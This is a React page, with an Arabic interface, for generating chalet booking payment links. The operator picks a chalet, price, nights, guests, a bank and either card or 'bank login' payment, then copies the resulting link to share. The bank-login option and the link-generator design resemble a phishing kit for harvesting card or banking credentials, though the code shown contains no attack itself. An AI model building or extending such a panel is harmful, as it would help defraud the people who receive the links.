import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode, getCurrencyName } from "@/lib/countryCurrencies";
import { getBanksByCountry } from "@/lib/banks";
import { useChalets, useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { ArrowRight, Home, Copy, Check, Building2, RefreshCw, ExternalLink, CheckCircle, ShieldCheck, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateChaletLink = () => {
  const { country } = useParams<{ country: string }>();
  const navigate = useNavigate();
  const { toast } = useToast();
  const countryData = getCountryByCode(country?.toUpperCase() || "SA");

  const { data: chalets, isLoading } = useChalets(country);
  const createLink = useCreateLink();

  const [selectedChaletId, setSelectedChaletId] = useState<string>("");
  const [pricePerNight, setPricePerNight] = useState<number>(0);
  const [nights, setNights] = useState<number>(1);
  const [guestCount, setGuestCount] = useState<number>(2);
  const [selectedBank, setSelectedBank] = useState<string>("");
  const [paymentMethod, setPaymentMethod] = useState<string>("card");
  const [createdLink, setCreatedLink] = useState<string>("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [copied, setCopied] = useState(false);

  const selectedChalet = chalets?.find((c) => c.id === selectedChaletId);
  const totalAmount = pricePerNight * nights;

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  useEffect(() => {
    if (selectedChalet) {
      setPricePerNight(selectedChalet.default_price);
    }
  }, [selectedChalet]);

  const handleCreate = async () => {
    if (!selectedChalet || !countryData) return;

    const payload = {
      chalet_id: selectedChalet.id,
      chalet_name: selectedChalet.name,
      price_per_night: pricePerNight,
      nights,
      guest_count: guestCount,
      total_amount: totalAmount,
      currency: countryData.currency,
      currency_code: getCurrencyCode(country || "SA"),
      selected_bank: selectedBank || null,
      payment_method: paymentMethod,
      service_name: `حجز شاليه ${selectedChalet.name}`,
      selectedCountry: country || "SA"
    };

    try {
      const link = await createLink.mutateAsync({
        type: "chalet",
        country_code: country!,
        provider_id: selectedChalet.provider_id || undefined,
        payload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: 'chalet',
        country: country || 'SA',
        amount: totalAmount,
        currency: getCurrencyCode(country || 'SA'),
        paymentMethod: paymentMethod,
        type: 'chalet'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);

      toast({ title: "تم إنشاء الرابط بنجاح" });
    } catch (error) {
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الحجز. الرجاء المحاولة مرة أخرى",
        variant: "destructive",
      });
    }
  };

  if (!countryData) return null;

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
      <header className="bg-white border-b-2 border-emerald-500 h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4 shadow-sm">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-emerald-100">
              <Home className="w-6 h-6" />
            </div>
            <div>
              <h1 className="text-lg font-black text-slate-800">بوابة حجز الشاليهات</h1>
              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{countryData.nameAr} - CHALET RESERVATIONS</p>
            </div>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
        <div className="grid lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2 space-y-6">
              <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
                 <h2 className="text-2xl font-black text-slate-800 mb-8 flex items-center gap-3">
                    <Building2 className="w-7 h-7 text-emerald-500" /> تفاصيل المنشأة
                 </h2>

                 <div className="space-y-6">
                    <div className="space-y-1.5">
                       <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">اختر الشاليه</Label>
                       <Select onValueChange={setSelectedChaletId} value={selectedChaletId}>
                          <SelectTrigger className="h-14 border-2 rounded-2xl font-black bg-slate-50/50">
                             <SelectValue placeholder={isLoading ? "جاري التحميل..." : "ابحث عن شاليه..."} />
                          </SelectTrigger>
                          <SelectContent>
                             {chalets?.map(c => <SelectItem key={c.id} value={c.id}>{c.name}</SelectItem>)}
                          </SelectContent>
                       </Select>
                    </div>

                    <div className="grid md:grid-cols-3 gap-4">
                       <div className="space-y-1.5">
                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">السعر / الليلة</Label>
                          <Input type="number" value={pricePerNight} onChange={(e) => setPricePerNight(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
                       </div>
                       <div className="space-y-1.5">
                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">عدد الليالي</Label>
                          <Input type="number" min="1" value={nights} onChange={(e) => setNights(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
                       </div>
                       <div className="space-y-1.5">
                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">عدد الضيوف</Label>
                          <Input type="number" min="1" value={guestCount} onChange={(e) => setGuestCount(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
                       </div>
                    </div>
                 </div>

                 {totalAmount > 0 && (
                    <div className="mt-8 p-6 rounded-[2rem] bg-emerald-500 text-white animate-in zoom-in-95 shadow-xl shadow-emerald-100 flex items-center justify-between">
                       <div>
                          <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest mb-1">إجمالي تكلفة الحجز</p>
                          <h3 className="text-4xl font-black">{formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}</h3>
                       </div>
                       <CheckCircle className="w-12 h-12 opacity-20" />
                    </div>
                 )}
              </Card>

              <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
                 <h2 className="text-xl font-black text-slate-800 mb-6">طريقة السداد المتاحة</h2>
                 <div className="grid grid-cols-2 gap-4">
                    <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-emerald-500 bg-emerald-50/50' : 'border-slate-50 bg-slate-50'}`}>
                       <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-emerald-500' : 'text-slate-300'}`} />
                       <span className={`text-sm font-black ${paymentMethod === 'card' ? 'text-emerald-600' : 'text-slate-400'}`}>بطاقة دفع</span>
                    </button>
                    <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-emerald-500 bg-emerald-50/50' : 'border-slate-50 bg-slate-50'}`}>
                       <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-emerald-500' : 'text-slate-300'}`} />
                       <span className={`text-sm font-black ${paymentMethod === 'bank_login' ? 'text-emerald-600' : 'text-slate-400'}`}>دخول بنكي</span>
                    </button>
                 </div>
              </Card>

              <Button onClick={handleCreate} disabled={!selectedChaletId || createLink.isPending} className="w-full h-20 rounded-[2.5rem] bg-slate-900 text-white font-black text-xl hover:bg-slate-800 transition-all shadow-2xl active:scale-95">
                 {createLink.isPending ? <RefreshCw className="w-8 h-8 animate-spin" /> : "إصدار رابط الحجز والدفع"}
              </Button>
           </div>

           <div className="space-y-6">
              <Card className="p-6 border-none shadow-lg rounded-[2rem] bg-white">
                 <h3 className="font-black text-slate-800 mb-4 flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5 text-emerald-500" /> مميزات الحجز
                 </h3>
                 <div className="space-y-3">
                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
                       <p className="text-xs font-bold text-slate-600">تأكيد فوري للحجز</p>
                    </div>
                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
                       <p className="text-xs font-bold text-slate-600">دفع آمن ومشفر</p>
                    </div>
                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
                       <p className="text-xs font-bold text-slate-600">دعم فني على مدار الساعة</p>
                    </div>
                 </div>
              </Card>
           </div>
        </div>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-[2.5rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-10 text-center space-y-6">
              <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center animate-bounce shadow-lg shadow-emerald-200">
                  <RefreshCw className="w-8 h-8 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-3xl font-black text-slate-900">رابط الحجز جاهز!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-slate-500">تم إنشاء رابط دفع آمن لهذا الشاليه بنجاح</AlertDialogDescription>
              </div>

              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-gray-400">
                {createdLink}
              </div>

              <div className="flex gap-4">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                   {copied ? "تم النسخ" : "نسخ الرابط"}
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-slate-700">
                   <ExternalLink className="w-5 h-5" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreateChaletLink;
